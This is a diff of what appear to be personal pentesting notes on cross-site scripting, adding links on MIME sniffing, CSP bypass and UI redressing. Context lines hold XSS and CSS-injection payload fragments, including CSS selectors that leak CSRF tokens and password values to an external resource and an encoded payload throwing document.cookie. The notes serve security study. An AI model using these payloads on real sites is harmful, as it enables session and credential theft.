@@ -54,7 +54,7 @@ Example of different context and respective useful payloads:
 	- `${alert(document.domain)}`
 - [Client-side template injection (CSTI)](Client-side%20template%20injection%20(CSTI).md)
 	- [Client-side template injection in AngularJS](Client-side%20template%20injection%20(CSTI).md#Client-side%20template%20injection%20in%20AngularJS)
-
+- [Cross-Site Scripting using MIME sniffing](MIME%20sniffing.md#Cross-Site%20Scripting%20using%20MIME%20sniffing)
 ## Steal of cookies and session tokens
 
 Payload:
@@ -238,7 +238,7 @@ Other references:
 
 ## CSS injection and exfiltration
 
-The main technique to exfiltrate information via CSS Injection is to try to match a text with CSS and in case that text exist load some external resource
+The main technique to exfiltrate information via CSS Injection is to try to match a text with CSS and in case that text exist load some external resource:
 
 ```css
 input[name=csrf][value^=a]{
@@ -272,8 +272,9 @@ input[type="password"][value$="a"] {
 }
 ```
 
-More attacks can be found on [HackTricks - CSS Injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection)
+With CSS injection however, it is also possible to perform [UI redressing](Clickjacking.md#UI%20redressing%20and%20XSS) in order to re-define any CSS style included in the original page in order to hijack the original behavior.
 
+More attacks can be found on [HackTricks - CSS Injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection)
 
 ---
 
@@ -314,16 +315,16 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 
 Extensive cheat sheets can be found at:
 
+- [Multi-purpose snippets - JS AWAE Prep](https://mlcsec.com/posts/js-awae-prep/)
 - [[Evading Restrictions.md]]
 - [Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [javascript-bypass-blacklists-techniques](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#javascript-bypass-blacklists-techniques)
 - [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
-- [JS AWAE Prep](https://mlcsec.com/posts/js-awae-prep/)
 - [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
 - `eval(atob("base64"))`
 	- [eXtra Safe Security layers](../../Play%20ground/CTFs/eXtra%20Safe%20Security%20layers.md)
 	- [Mutation Lab](../../Play%20ground/CTFs/Mutation%20Lab.md)
-
+- [Bypass CSP using MIME sniffing](MIME%20sniffing.md#Bypass%20CSP%20using%20MIME%20sniffing)
 # XSS Prevention [^1]
 
 - **Filter input on arrival**
